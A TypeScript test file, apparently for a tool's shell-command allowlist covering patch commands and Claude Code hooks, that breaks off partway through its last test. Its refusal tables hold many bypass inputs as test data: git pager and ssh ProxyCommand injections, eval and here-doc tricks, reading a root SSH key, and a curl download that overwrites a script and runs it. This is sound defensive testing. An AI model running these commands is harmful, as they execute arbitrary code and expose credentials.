// Live patch commands and Claude Code hooks are held to a short list of
// shell (shell-allowlist.ts; Mike's call, 7 Nov 2026, after Gautam's scan
// and four review rounds that each found a shell trick the pattern
// follower in script-trust.ts didn't know). Mike's own live commands, from
// every patch in his repos, must still be accepted; everything outside the
// list is refused, the corners those rounds found and ones they didn't.
// The second half holds it to the outside review's ten requirements, one
// test each (R1-R10).
import { after, test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import { tmpDir } from '../helpers/fakes.ts';
import { runCommand } from '../../src/patches.ts';
import { liveCommandProblem, namedPaths, PatchTrust, scanModule } from '../../src/patch-trust.ts';
import { allowCommand, liveCommandEnv, ownedPathProblem, repoGitConfigProblem } from '../../src/shell-allowlist.ts';

const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', '-C', cwd, ...args], { stdio: 'pipe' }).toString();

function write(folder: string, files: Record<string, string>): void {
  for (const [name, body] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
    fs.writeFileSync(path.join(folder, name), body);
  }
}

// A folder in /tmp (sticky, root's), not under TMPDIR: a check host's
// TMPDIR can sit in a folder its group can write (the cloud box's umask is
// 002), and a file outside the repo is refused there (R9).
const made: string[] = [];
after(() => {
  for (const d of made) fs.rmSync(d, { recursive: true, force: true });
});
function ownTmp(): string {
  const d = fs.realpathSync(fs.mkdtempSync('/tmp/tb-allow-'));
  made.push(d);
  return d;
}

// Folders 755 and files 644 from `dir` down, as a checkout of Mike's is:
// a host whose umask is 002 would leave them group-writable, which an
// outside file must not be (R9).
function tidy(dir: string): void {
  fs.chmodSync(dir, 0o755);
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) tidy(p);
    else if (e.isFile()) fs.chmodSync(p, 0o644);
  }
}

// Every live command (sh(...) in a badge, `when`, summary or list panel)
// in the patches in Mike's repos on 7 Nov 2026, as the runner gets them
// (a template's `${...}` filled in as the patch fills it).
const MIKES = {
  // bruce-ops/.threadbear/patches/bruce.ts
  bruce: "ssh -o ConnectTimeout=4 -o BatchMode=yes bruce 'launchctl list; echo ---; df -h / /Volumes/CannMedia; echo ---; memory_pressure -Q | tail -1'",
  // cannvas/.threadbear/patches/cannvas.ts
  cannvasFeedback: 'npx convex data items --component feedback --prod --format jsonLines --limit 200',
  cannvasFetch: 'git fetch -q origin main',
  cannvasDeployed: 'ssh -o ConnectTimeout=4 -o BatchMode=yes cannvas readlink /opt/cannvas/current',
  cannvasOnMain: 'git merge-base --is-ancestor 3f9c2a1 origin/main && echo yes || echo no',
  cannvasBehind: 'git rev-list --count 3f9c2a1..origin/main',
  cannvasMerged: 'gh pr list --state merged --limit 200 --json headRefName',
  cannvasBranches: "git branch -a --no-merged origin/main --sort=-committerdate --format='%(refname:short)%09%(committerdate:relative)%09%(subject)'",
  // port-geo-christmas-lights-cruise/.threadbear/patches/entries.ts
  portGeo: 'npx convex data entries --prod --format jsonLines --limit 1000',
  // poddle/.threadbear/patches/poddle.ts
  poddleVersions: 'node scripts/asc-status.mjs 6825613455',
  poddleFeedback: 'npx convex data items --component feedback --prod --format jsonLines --limit 200',
  poddleStats: 'npx convex run --prod adminStats:overview',
  // tandem/.threadbear/patches/tandem.ts (its quote() around each path)
  tandem: "tandem waiting --json '/Users/m5-mike/Movies/My Video/edit.tandem' '/Users/m5-mike/Movies/it'\\''s/b.tandem'",
  // stocks/.threadbear/patches/holdings.ts
  stocksBalance: 'stocks balance',
  stocksPositions: 'stocks positions',
  // walkies (and the walkies-arrow and walkies-baked-tests copies)/.threadbear/patches/stats.ts
  walkiesStats: 'npx convex run --prod stats:overview',
  // walkies/.threadbear/patches/walkies.ts
  walkiesFeedback: 'npx convex data items --component feedback --prod --format jsonLines --limit 200',
  // The one mikecann/walkies#79 rewrote without perl.
  walkiesPixel: 's=$(cat ~/.config/walkies/dads-pixel-serial 2>/dev/null) || { echo 0; exit 0; }; { dns-sd -B _adb-tls-connect._tcp local. & p=$!; sleep 3; kill $p; } 2>/dev/null | grep -c "adb-$s" || true',
};
// Ones that run a script in another of Mike's repos (stashit, walkies,
// and Threadbear's own app-store.ts, which is always trusted anyway).
const MIKES_OUTSIDE = {
  ascStatus: 'node ~/dev/me/poddle/scripts/asc-status.mjs 6826105788',
  ascThere: 'test -f ~/dev/me/poddle/scripts/asc-status.mjs',
};

// A repo laid out like Mike's: a real git checkout, convex installed (not
// committed), a script of its own, and a home with poddle's script in it.
function mikesRepo() {
  const root = ownTmp();
  const repo = path.join(root, 'repo');
  const home = path.join(root, 'home');
  write(repo, {
    '.gitignore': 'node_modules\n',
    'package.json': JSON.stringify({ name: 'app', type: 'module', scripts: { build: 'node scripts/build.mjs', lint: 'echo lint' } }),
    'scripts/asc-status.mjs': "import fs from 'node:fs';\nconsole.log(JSON.stringify({ versions: [] }), fs.existsSync('.'));\n",
    'scripts/build.mjs': 'console.log(1);\n',
    'tools/count.sh': '#!/bin/sh\necho 3\n',
    'node_modules/convex/package.json': JSON.stringify({ name: 'convex', bin: { convex: 'bin/main.js' } }),
    'node_modules/convex/bin/main.js': '#!/usr/bin/env node\nconsole.log(1);\n',
  });
  fs.mkdirSync(path.join(repo, 'node_modules/.bin'), { recursive: true });
  fs.symlinkSync('../convex/bin/main.js', path.join(repo, 'node_modules/.bin/convex'));
  fs.chmodSync(path.join(repo, 'tools/count.sh'), 0o755);
  write(home, { 'dev/me/poddle/scripts/asc-status.mjs': 'console.log(1);\n', '.config/walkies/dads-pixel-serial': 'abc\n' });
  tidy(home);
  git(repo, 'init', '-q');
  git(repo, 'add', '.');
  git(repo, 'commit', '-qm', 'one');
  return { root, repo, home };
}

const opts = (folder: string, extra: Record<string, unknown> = {}) => ({
  folder,
  top: folder,
  scanJs: (src: string, file: string) => {
    const s = scanModule(src, file);
    return { specifiers: s.specifiers, packages: s.packages, strings: s.strings, ...(s.problem ? { problem: s.problem.code } : {}) };
  },
  resolveImport: (dir: string, spec: string) => path.resolve(dir, spec),
  namedPaths,
  ...extra,
});

const live = (folder: string, command: string, extra: Record<string, unknown> = {}) => allowCommand(command, '`cmd`', { ...opts(folder, extra), live: true });
const hook = (folder: string, command: string) => allowCommand(command, 'A hook', { ...opts(folder), strict: true }, { CLAUDE_PROJECT_DIR: folder });

// The files a trusted patch holding `commands` hashed, as liveCommandProblem gets them.
async function trustedFiles(repo: string, commands: string[]): Promise<{ files: string[]; blocked: Record<string, string> }> {
  write(repo, { '.threadbear/patches/live.ts': `const cmds = ${JSON.stringify(commands)};\nexport default { panels: [{ title: 'L', items: async ({ sh }) => Promise.all(cmds.map((c) => sh(c))) }] };\n` });
  const trust = new PatchTrust();
  const file = path.join(repo, '.threadbear/patches/live.ts');
  assert.equal(trust.trustCurrent([file]).length, 1);
  const v = await trust.check(file, 0);
  assert.ok(v.trusted && v.files);
  return { files: v.files!, blocked: v.trusted ? (v.blocked ?? {}) : {} };
}

const refusedLive = (repo: string, cases: [string, RegExp][], extra: Record<string, unknown> = {}) => {
  for (const [command, why] of cases) assert.match(live(repo, command, extra).problem ?? 'accepted', why, command);
};
const refusedHook = (repo: string, cases: [string, RegExp][]) => {
  for (const [command, why] of cases) assert.match(hook(repo, command).problem ?? 'accepted', why, command);
};

test("every live command in Mike's patches is on the short list", async () => {
  const { repo, home } = mikesRepo();
  for (const [name, command] of Object.entries(MIKES)) assert.equal(live(repo, command, { home }).problem, undefined, name);
  for (const [name, command] of Object.entries(MIKES_OUTSIDE)) assert.equal(live(repo, command, { home }).problem, undefined, name);
  // And through the gate the runner uses, against what the hash covered.
  const { files, blocked } = await trustedFiles(repo, Object.values(MIKES));
  for (const [name, command] of Object.entries(MIKES)) assert.equal(liveCommandProblem(command, repo, files, blocked), undefined, name);
  // node scripts/asc-status.mjs reaches the script, which the hash covered.
  assert.ok(live(repo, MIKES.poddleVersions).files.includes(path.join(repo, 'scripts/asc-status.mjs')));
});

test("the one that can't fit: walkies-arrow's older Pixel check still runs perl, which stays refused", () => {
  const { repo } = mikesRepo();
  const old = `s=$(cat ~/.config/walkies/dads-pixel-serial 2>/dev/null) || { echo 0; exit 0; }; perl -e 'alarm 3; exec @ARGV' dns-sd -B _adb-tls-connect._tcp local. 2>/dev/null | grep -c "adb-$s" || true`;
  assert.match(live(repo, old).problem ?? '', /runs perl, which isn't on the short list/);
});

test('npx runs only convex, installed in node_modules/.bin: one it would fetch, flags before the name, or another package are refused', () => {
  const { repo } = mikesRepo();
  refusedLive(repo, [
    ['npx some-tool --x', /only `npx convex data` and `npx convex run`/],
    ['npx -y convex run --prod stats:overview', /`npx -y`/],
    ['npx convex@latest run --prod stats:overview', /`npx convex@latest`/],
  ]);
  fs.rmSync(path.join(repo, 'node_modules/.bin/convex'));
  assert.match(live(repo, 'npx convex run --prod stats:overview').problem ?? '', /isn't installed in node_modules\/\.bin, so npx would fetch/);
  fs.symlinkSync('../convex/bin/main.js', path.join(repo, 'node_modules/.bin/convex'));
  // An .npmrc that sets anything that could run code stops npx.
  write(repo, { '.npmrc': 'registry=https://registry.npmjs.org/\nnode-options=--require ./x.cjs\n' });
  assert.match(live(repo, 'npx convex run --prod stats:overview').problem ?? '', /sets node-options/);
  fs.writeFileSync(path.join(repo, '.npmrc'), 'registry=https://registry.npmjs.org/\nsave-exact=true\n');
  assert.equal(live(repo, 'npx convex run --prod stats:overview').problem, undefined);
});

// Commands the pattern follower let through on main, which run code the
// hash never saw (or that zsh and bash read differently from it).
const BYPASSES: [string, RegExp][] = [
  // zsh reads a lone `}` anywhere as the end of the group.
  ["{ echo } python3 -c 'print(1)'; }", /lone `}`/],
  // zsh's =cmd is the path of cmd.
  ['=python3 -c "print(1)"', /starting `=`/],
  ['echo =python3', /starting `=`/],
  // zsh's own loops and precommand words.
  ["repeat 1 python3 -c 'print(1)'", /`repeat`/],
  ['noglob python3 -c x', /`noglob`/],
  // Programs that run what they're handed.
  ["script -q /dev/null python3 -c 'print(1)'", /runs script, which isn't on the short list/],
  ["tmux new-session -d 'python3 -c x'", /runs tmux/],
  ["gdb -batch -ex 'shell id'", /runs gdb/],
  ["vim -c '!id' -c q", /runs vim/],
  ["tar -cf /dev/null --to-command='id' x", /runs tar/],
  ['open -a Terminal ./evil.command', /runs open/],
  // Options of allowed programs that run a command.
  ["git -c core.pager='sh -c id' log", /`git -c`/],
  ['git --exec-path=./bin status', /`git --exec-path=\.\/bin`/],
  ['git -C ./sub status', /`git -C`/],
  ['git fetch --upload-pack=./evil.sh origin', /`git fetch --upload-pack/],
  ['git config alias.x "!id"', /`git config`/],
  ['git submodule foreach id', /`git submodule`/],
  ["ssh -o ProxyCommand='id' host", /`ssh -o` with `ProxyCommand=id`/],
  ['ssh -oLocalCommand=id -oPermitLocalCommand=yes host', /`ssh -oLocalCommand=id`/],
  ['ssh -F ./ssh_config host', /`ssh -F`/],
  ["awk 'BEGIN { system(\"id\") }'", /runs awk, which isn't on the short list/],
  ["sed -n 'e id' /dev/null", /runs sed, which isn't on the short list/],
  ['sort --compress-program=./x.sh a', /runs sort, which isn't on the short list/],
  ["gh alias set x --shell 'id'", /`gh alias set`/],
  ['gh extension exec x', /`gh extension exec`/],
  // A file of the repo's run after something that could have written it.
  ['cp /dev/null ./scripts/build.mjs; node scripts/build.mjs', /runs cp, which isn't on the short list/],
  ['echo id > ./scripts/build.mjs && node scripts/build.mjs', /writes to \.\/scripts\/build\.mjs/],
  ['git fetch -q origin main; node scripts/build.mjs', /runs scripts\/build\.mjs and also runs git, which could change it/],
  ['curl -so ./scripts/build.mjs https://example.com/x && node scripts/build.mjs', /runs curl, which isn't on the short list/],
  // zsh's printf reads a number's argument as arithmetic.
  ["printf %d 'a[$(id)]'", /runs printf, which isn't on the short list/],
  ["[ 'a[$(id)]' -eq 1 ]", /`\[`, which isn't on the short list|runs \[/],
];

test('the shell tricks the pattern follower let through are refused', () => {
  const { repo } = mikesRepo();
  refusedLive(repo, BYPASSES);
});

test("...and refused at the gate a trusted patch's live function goes through, so they never run", async () => {
  const { repo } = mikesRepo();
  const { files, blocked } = await trustedFiles(repo, ['node scripts/build.mjs']);
  for (const [command] of BYPASSES) assert.ok(liveCommandProblem(command, repo, files, blocked), command);
  assert.equal(liveCommandProblem('node scripts/build.mjs', repo, files, blocked), undefined);
});

// The shell features the earlier review rounds found one by one: each is
// simply not on the list, for a hook (with its fuller list) and, for any
// reason, for a live command.
const OFF_LIST: [string, RegExp][] = [
  ['bash <<EOF\nid\nEOF', /here-doc/],
  ['cat <<< id | sh', /here-doc or here-string/],
  ['source <(echo id)', /process substitution/],
  ['cat >(sh)', /process substitution/],
  ['eval "$(cat ./x)"', /`eval`/],
  ["$'\\142ash' -c id", /`\$'`/],
  ['sh /dev/stdin < ./x', /reads what to run from its input/],
  ['sh < ./x', /reading what to run from its input/],
  ['bash -c id', /`bash -c`/],
  ['zsh -s < ./x', /`zsh -s`/],
  ['bash --rcfile ./x -i', /`bash --rcfile`/],
  ['env -S "sh -c id"', /env -S/],
  ['env FOO=1 ./tools/count.sh', /env FOO=1/],
  ['env sh -c id', /through env, which patch trust only follows for a script of the repo's/],
  ['xargs sh -c id', /runs xargs, which isn't on the short list/],
  ["find . -exec sh -c id ';'", /find -exec/],
  ['nohup python3 x.py', /through nohup/],
  ['timeout 5 sh -c id', /through timeout/],
  ['f() { id; }; f', /a function/],
  ['function f { id; }', /a function/],
  ['alias ls=id; ls', /`alias`/],
  ['exec ./tools/count.sh', /`exec`/],
  ['trap id EXIT', /`trap`/],
  ['export NODE_OPTIONS="--require ./x.cjs"; node scripts/build.mjs', /`export`/],
  ['NODE_OPTIONS="--require ./x.cjs" node scripts/build.mjs', /for one command/],
  ['PATH=./bin:$PATH; tool', /sets PATH/],
  ['path=(./bin)', /a `\(` after a word|sets path/],
  ['IFS=x', /sets IFS/],
  ['./tools/*.sh', /a glob/],
  ['sh ./tools/{count,other}.sh', /brace expansion/],
  ['echo `id`', /backticks/],
  ['echo $((1+1))', /arithmetic/],
  ['[[ -n x ]]', /`\[\[`/],
  ['((x=1))', /`\(\(`/],
  ['echo ${x:-$(id)}', /only a plain \$\{NAME\}/],
  ['echo ${!x}', /only a plain \$\{NAME\}/],
  ['cmd=$(cat ./x); $cmd', /worked out as it runs/],
  ['"$x"', /worked out as it runs/],
  ['echo "$p[1]"', /zsh subscript/],
  ['echo $p:h', /zsh modifier/],
  ['cat ~root/.ssh/id_rsa', /`~user`/],
  ['echo a#b', /unquoted `#`/],
  ['echo hi # a comment', /a comment/],
  ['ls ^x', /unquoted `\^`/],
  ['exec 3< ./x; sh /dev/fd/3', /`exec`/],
  ['> ./x', /a redirect with no command/],
  ['echo x &> /dev/null', /`&>`/],
  ['echo x >| ./y', /`>\|`/],
  ['echo x |& cat', /`\|&`/],
  ['sleep 1 &|', /zsh's `&\|`/],
  ['echo x > "$f"', /file worked out as it runs/],
  ['echo x 10>/dev/null', /above 9/],
  ['echo x >&file', /something other than a file descriptor/],
  ['coproc id', /a coprocess/],
  ['time id', /`time`/],
  ['emulate sh -c id', /`emulate`/],
  ['zmodload zsh/system', /`zmodload`/],
  ['r', /`r`/],
  ['if true; then id; fi', /`if` \(a script can, a command can't\)/],
  ['while true; do id; done', /`while`/],
  ['source ~/.zshrc', /outside the repo/],
  ['. lib.sh', /a name the shell looks for on PATH/],
  ['node -e "require(\'child_process\')"', /`node -e`/],
  ['node --require ./x.cjs scripts/build.mjs', /`node --require/],
  ['node --test', /`node --test`/],
  ['node -', /`node -`/],
  ['python3 x.py', /runs python3/],
  ['deno run x.ts', /runs deno/],
  ['npm install', /`npm install`/],
  ['npm exec x', /`npm exec`/],
  ['npm run missing', /isn't in package\.json/],
  ['bun test', /`bun test`/],
  ['make all', /runs make/],
  ['sudo id', /runs sudo/],
  ['kill $x', /`kill` with `\$x`/],
  ['exit $x', /plain number/],
  ['read -p x y', /`read` with/],
  ['command id', /`command` other than/],
  ['set -o posix', /`set`/],
];

test('shell outside the list is refused, whatever it is', () => {
  const { repo } = mikesRepo();
  refusedHook(repo, OFF_LIST);
  for (const [command] of OFF_LIST) assert.ok(live(repo, command).problem, command);
});

test('what is on the list is accepted: words, strings, variables, $(...) of allowed commands, pipes, && || ;, groups, &, redirects to /dev/null', () => {
  const { repo } = mikesRepo();
  for (const command of [
    'echo hi',
    "echo 'a b' \"c $HOME ${HOME}\" d\\ e",
    'x=1; echo "$x"',
    'v=$(git rev-list --count main) && echo done',
    'git branch -a | grep -c "a"',
    '{ echo a; echo b; } 2>/dev/null | grep -c "a"',
    '( echo a && true )',
    'cat /dev/null > /dev/null 2>&1',
    '! true',
    'test -f ./tools/count.sh && echo yes',
    'sleep 1 & p=$!; kill $p',
    'sleep 1 & kill -TERM $!',
    'echo x >&2',
    'cat /dev/null </dev/null',
  ]) {
    assert.equal(live(repo, command).problem, undefined, command);
  }
  // Nor does it read through `<`: zsh's <1-10> is a glob.
  assert.match(live(repo, 'cat /dev/null <1-10> /dev/null').problem ?? '', /reads from 1-10/);
  // A hook has the fuller list: the repo's scripts, package scripts, cd,
  // printf, [, awk and the programs that load and write nothing.
  for (const command of [
    '( cd tools && ls )',
    './tools/count.sh',
    'sh ./tools/count.sh',
    'npm run build',
    'npm run -s lint',
    '[ 1 -eq 1 ]',
    "awk -F, '{ print $1 }' /dev/null",
    'printf "%s\\n" "$HOME"',
    'printf %d 3',
    'jq -r .x /dev/null',
    'echo $?',
    "find . -name '*.md' -type f",
    'say done',
    'uniq /dev/null',
  ]) {
    assert.equal(hook(repo, command).problem, undefined, command);
  }
});

test('a script a hook runs is held to the list too (control flow allowed), and so is a package script', () => {
  const { repo } = mikesRepo();
  write(repo, {
    'tools/ok.sh': '#!/bin/zsh\n# fine\nset -euo pipefail\ncd "$(dirname "$0")/.." || exit 1\nif [ -f package.json ]; then\n  for f in a b; do echo "$f"; done\nfi\ncase "$1" in\n  -h|--help) echo help ;;\n  *) ./tools/count.sh ;;\nesac\n',
    'tools/eval.sh': '#!/bin/sh\neval "$(cat ./tools/steps.txt)"\n',
    'tools/fn.sh': '#!/bin/sh\nf() { python3 -c x; }\nf\n',
    'tools/heredoc.sh': '#!/bin/sh\nsh <<EOF\nid\nEOF\n',
    'tools/flags.sh': '#!/bin/sh -s\necho\n',
    'tools/evil-lib.sh': 'python3 -c x\n',
    'tools/sources.sh': '#!/bin/sh\n. ./tools/evil-lib.sh\n',
    'package.json': JSON.stringify({ name: 'app', scripts: { ok: 'echo ok && ./tools/count.sh', bad: 'eval "$X"', pre: 'echo', prebad2: 'python3 -c x', bad2: 'echo' } }),
  });
  assert.equal(hook(repo, './tools/ok.sh').problem, undefined);
  assert.ok(hook(repo, './tools/ok.sh').files.includes(path.join(repo, 'tools/count.sh')), 'what the script runs is followed');
  assert.match(hook(repo, './tools/eval.sh').problem ?? '', /tools\/eval\.sh line 2 uses the shell's `eval`/);
  assert.match(hook(repo, './tools/fn.sh').problem ?? '', /tools\/fn\.sh line 2 uses a `\(` after a word \(a function/);
  assert.match(hook(repo, './tools/heredoc.sh').problem ?? '', /here-doc/);
  assert.match(hook(repo, './tools/flags.sh').problem ?? '', /#! line/);
  assert.match(hook(repo, './tools/sources.sh').problem ?? '', /evil-lib\.sh line 1 runs python3/);
  assert.equal(hook(repo, 'npm run ok').problem, undefined);
  assert.match(hook(repo, 'npm run bad').problem ?? '', /"bad" script line 1 uses the shell's `eval`/);
  assert.match(hook(repo, 'npm run bad2').problem ?? '', /"prebad2" script line 1 runs python3/);
});

test("a Claude Code hook gets its list, without `&`, and only programs known to load nothing from the folder", () => {
  const { repo } = mikesRepo();
  write(repo, { '.claude/hooks/session-start.mjs': "console.log('hi');\n", 'hook.sh': '#!/bin/sh\necho hi\n' });
  const h = (command: string) => hook(repo, command).problem;
  // lets-build-it's hooks, and the usual shapes.
  assert.equal(h('bun .claude/hooks/session-start.mjs'), undefined);
  assert.equal(h('cd "$CLAUDE_PROJECT_DIR" && ./hook.sh'), undefined);
  assert.equal(h('"$CLAUDE_PROJECT_DIR"/hook.sh'), undefined);
  assert.equal(h('say done'), undefined);
  assert.match(h('./hook.sh &') ?? '', /in the background/);
  assert.match(h('git status') ?? '', /runs git, which isn't on the short list of programs a Claude Code hook may run/);
  assert.match(h('npx convex dev') ?? '', /runs a package by name/);
});

test('the parser stays linear on hostile input', () => {
  const { repo } = mikesRepo();
  const t = (command: string) => {
    const start = process.cpuUsage();
    live(repo, command);
    const d = process.cpuUsage(start);
    return (d.user + d.system) / 1000;
  };
  const base = t('echo ' + 'a '.repeat(20_000));
  for (const command of ['$(' .repeat(20) + 'echo' + ')'.repeat(20), 'echo ' + '"$x"'.repeat(8_000), 'x=1; '.repeat(6_000), 'echo a | '.repeat(5_000) + 'true', "'".repeat(30_000), 'git rev-list --count ' + 'a.'.repeat(5_000) + '.b']) {
    assert.ok(t(command) < 50 * base + 200, command.slice(0, 30));
  }
});

// ---- the outside review's requirements ----

test('R1: program names are compared in lower case and by the name a path resolves to, so every spelling gets the same treatment', () => {
  const { repo, root } = mikesRepo();
  // The same checks as the plain name.
  assert.equal(live(repo, 'GIT fetch -q origin main').problem, undefined);
  assert.equal(live(repo, 'NPX convex run --prod stats:overview').problem, undefined);
  refusedLive(repo, [
    ['Git -c core.pager=id log', /`git -c`/],
    ['/usr/bin/git -c core.pager=id log', /`git -c`/],
    ['SSH -o ProxyCommand=id host', /`ssh -o` with `ProxyCommand=id`/],
    ['NODE -e 1', /`node -e`/],
    ['Perl -e 1', /runs perl/],
  ]);
  refusedHook(repo, [
    ['SH -c id', /`sh -c`/],
    ['Bash -c id', /`bash -c`/],
    ['/bin/bash -c id', /`bash -c`/],
    // /bin/sh is dash on Ubuntu: a shell under a shell's name is still a shell.
    ['/bin/sh -c id', /`sh -c`/],
    ['FIND . -delete', /find -delete/],
    ['Xargs sh -c id', /runs xargs/],
    ['NPX convex dev', /runs a package by name/],
    ['Awk \'BEGIN { system("id") }\'', /awk program that may run a command/],
  ]);
  // A builtin or reserved word isn't the shell's in another case or by a
  // path (macOS's /usr/bin/cd changes nothing), so it isn't followed as one.
  refusedHook(repo, [
    ['CD tools && ./count.sh', /isn't the shell's `cd`/],
    ['EVAL id', /isn't the shell's `eval`/],
    ['IF true', /isn't the shell's `if`/],
    // (Linux has no /usr/bin/cd, so there it isn't there to run.)
    ['/usr/bin/cd tools && ./count.sh', /a path to `cd`|isn't there/],
    ['Source ./tools/count.sh', /isn't the shell's `source`/],
  ]);
  // A link outside the repo named like an allowed program is what it points to.
  const bin = path.join(root, 'bin');
  fs.mkdirSync(bin, { mode: 0o755 });
  fs.symlinkSync('/bin/sh', path.join(bin, 'cat'));
  fs.chmodSync(root, 0o755);
  assert.match(hook(repo, `${bin}/cat -c id`).problem ?? '', /under another name/);
  assert.match(live(repo, `${bin}/cat /dev/null`).problem ?? '', /under another name/);
});

test('R2: a lone `{` or `}` is refused anywhere but a group it opens or closes, after a redirect too', () => {
  const { repo } = mikesRepo();
  const cases: [string, RegExp][] = [
    ["{ echo } python3 -c 'print(1)'; }", /lone `}`/],
    ['{ >/dev/null } python3 -c x; }', /lone `}`/],
    ['echo >/dev/null }', /lone `}`/],
    ['>/dev/null { echo; }', /lone `{`/],
    ['{ echo a; } }', /lone `}`|`}` after a command/],
    ['echo {', /lone `{`/],
    ['echo a 2>/dev/null } b', /lone `}`/],
    ['echo x > }', /lone `}`/],
  ];
  refusedLive(repo, cases);
  refusedHook(repo, cases);
  write(repo, { 'tools/b.sh': '#!/bin/sh\nfor x in a } b; do echo "$x"; done\n', 'tools/c.sh': '#!/bin/sh\ncase x in\n  }) echo ;;\nesac\n' });
  assert.match(hook(repo, './tools/b.sh').problem ?? '', /line 2 uses a lone `}`/);
  assert.match(hook(repo, './tools/c.sh').problem ?? '', /lone `}`/);
  // Groups themselves, and a redirect after one, are fine.
  assert.equal(live(repo, '{ echo a; } 2>/dev/null').problem, undefined);
  assert.equal(live(repo, '{ { echo a; }; } >/dev/null').problem, undefined);
});

test("R3: a live command runs only the programs Mike's patches run, in the forms they use; the installed-program fallback is gone", () => {
  const { repo } = mikesRepo();
  refusedLive(repo, [
    // Programs that were "installed programs" before.
    ['ls', /runs ls, which isn't on the short list/],
    ['jq -r .x /dev/null', /runs jq/],
    ['date', /runs date/],
    ['whoami', /runs whoami/],
    ['say hi', /runs say/],
    ['head -1 /dev/null', /runs head/],
    ['wc -l /dev/null', /runs wc/],
    ['tr a b', /runs tr/],
    ['terminal-notifier -message hi', /runs terminal-notifier/],
    ['my-own-tool --flag', /runs my-own-tool/],
    // Builtins and the repo's scripts, which a live command doesn't run.
    ['cd tools', /runs cd/],
    ['printf %s x', /runs printf/],
    ['read x', /runs read/],
    ['wait', /runs wait/],
    ['sh ./tools/count.sh', /runs sh/],
    ['npm run build', /runs npm/],
    // Mike's programs in forms his patches don't use.
    ['git status', /`git status`, which isn't one of the git commands on the short list/],
    ['git log --oneline', /`git log`/],
    ['gh api /user', /`gh api \/user`/],
    ['gh pr view 1', /`gh pr view`/],
    ['npx convex deploy', /`npx convex deploy`/],
    ['npx convex run --prod stats:overview \'{"x":1}\'', /2 words after its options/],
    ['npx convex run --prod users:deleteAll', /with `users:deleteAll`/],
    ['npx convex data items --push', /`npx convex data --push`/],
    ['tandem render x', /with `render`/],
    ['stocks buy AAPL', /2 words after its options|`buy`/],
    ['grep -r x .', /`grep -r`/],
    ['dns-sd -R x _http._tcp local. 80', /`dns-sd -R`/],
    ['test -n x', /`test` other than as `test -f <path>`/],
    ['cat -v /dev/null', /`cat -v`/],
    ['sleep 1000', /with `1000`/],
    ['true x', /`true` with words/],
    ['exit 1 2', /plain number/],
    ['node --inspect scripts/build.mjs', /`node --inspect`/],
  ]);
});

test("R3: a hashed script a live command runs is held to the same live list, so a script can't reach what the command can't", () => {
  const { repo } = mikesRepo();
  assert.equal(live(repo, './tools/count.sh').problem, undefined);
  assert.ok(live(repo, './tools/count.sh').files.includes(path.join(repo, 'tools/count.sh')));
  write(repo, {
    'tools/ls.sh': '#!/bin/sh\nls\n',
    'tools/git.sh': '#!/bin/sh\ngit status\n',
    'tools/writes.sh': '#!/bin/sh\necho x > ./out.txt\n',
    'tools/cd.sh': '#!/bin/sh\ncd /tmp\n',
    'tools/branch.sh': '#!/bin/sh\nset -e\nif test -f ./x; then echo yes; else echo no; fi\n',
    'tools/sh.sh': '#!/bin/sh\nsh ./tools/count.sh\n',
    'tools/nested.sh': '#!/bin/sh\n./tools/ls.sh\n',
    'tools/py': '#!/usr/bin/env python3\nprint(1)\n',
  });
  for (const f of ['ls', 'git', 'writes', 'cd', 'branch', 'sh', 'nested', 'py']) fs.chmodSync(path.join(repo, `tools/${f}${f === 'py' ? '' : '.sh'}`), 0o755);
  refusedLive(repo, [
    ['./tools/ls.sh', /tools\/ls\.sh line 2 runs ls, which isn't on the short list/],
    ['./tools/git.sh', /tools\/git\.sh line 2 runs `git status`/],
    ['./tools/writes.sh', /tools\/writes\.sh line 2 writes to \.\/out\.txt/],
    ['./tools/cd.sh', /tools\/cd\.sh line 2 runs cd/],
    ['./tools/sh.sh', /tools\/sh\.sh line 2 runs sh/],
    ['./tools/nested.sh', /tools\/ls\.sh line 2 runs ls/],
    ['./tools/py', /isn't a shell script or JavaScript/],
    // A word worked out as it runs doesn't reach it.
    ['x=$(cat /dev/null); ./tools/count.sh "$x"', /worked out as it runs/],
    // Nor does anything run beside it that could change it first.
    ['git fetch -q origin main; ./tools/count.sh', /and also runs git, which could change it/],
  ]);
  assert.equal(live(repo, './tools/branch.sh').problem, undefined);
  // A variable that may still hold something else isn't a process.
  write(repo, { 'tools/kill.sh': '#!/bin/sh\nif test -f ./x; then p=-1; else sleep 1 & p=$!; fi\nkill $p\n' });
  fs.chmodSync(path.join(repo, 'tools/kill.sh'), 0o755);
  assert.match(live(repo, './tools/kill.sh').problem ?? '', /tools\/kill\.sh line 3 runs `kill` with `\$p`/);
});

test("Muse's review: where a hook's script is, and what node_modules/.bin/convex is, are checked rather than assumed", async () => {
  const { repo, root } = mikesRepo();
  const script = (name: string, body: string) => {
    write(repo, { [name]: `#!/bin/sh\n${body}\n` });
    fs.chmodSync(path.join(repo, name), 0o755);
  };
  // A cd that fails leaves the shell where it was.
  write(repo, { 'sub/evil.sh': 'echo fine\n', 'evil.sh': 'python3 -c x\n' });
  script('tools/badcd.sh', 'cd sub; cd nope; ../evil.sh');
  assert.match(hook(repo, './tools/badcd.sh').problem ?? '', /`cd` to nope, which isn't a folder/);
  script('tools/badcd2.sh', 'cd sub; cd "$(cd nope; pwd)"; ../evil.sh');
  assert.match(hook(repo, './tools/badcd2.sh').problem ?? '', /couldn't follow/);
  // Through a link, `..` isn't what it looks like.
  fs.mkdirSync(path.join(root, 'away/in'), { recursive: true });
  fs.symlinkSync(path.join(root, 'away/in'), path.join(repo, 'link'));
  script('tools/linkcd.sh', 'cd link; ../evil.sh');
  assert.match(hook(repo, './tools/linkcd.sh').problem ?? '', /couldn't follow/);
  // ${BASH_SOURCE[0]} is empty in zsh, and a sourced file's $0 differs too.
  script('tools/run.sh', 'echo hi');
  script('tools/bs.sh', 'cd "$(dirname "${BASH_SOURCE[0]}")"; ./run.sh');
  assert.match(hook(repo, './tools/bs.sh').problem ?? '', /runs dirname with `\$BASH_SOURCE`/);
  script('tools/arg0.sh', 'cd "$(dirname "$0")"; ./run.sh');
  assert.equal(hook(repo, './tools/arg0.sh').problem, undefined);
  write(repo, { 'tools/lib.sh': 'cd "$(dirname "$0")"; ./run.sh\n' });
